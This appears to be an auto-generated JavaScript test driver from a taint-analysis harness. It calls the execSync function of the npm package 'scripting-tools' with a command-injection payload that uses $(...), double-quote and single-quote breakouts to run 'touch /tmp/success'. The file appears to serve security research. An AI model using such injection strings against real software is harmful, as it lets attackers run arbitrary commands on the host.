// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/scripting-tools/node_modules/scripting-tools');
try {
	var x0 = {};
var x1 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
new PUT["execSync"](x0,x1)();
} catch (e) {
	console.log(e);
}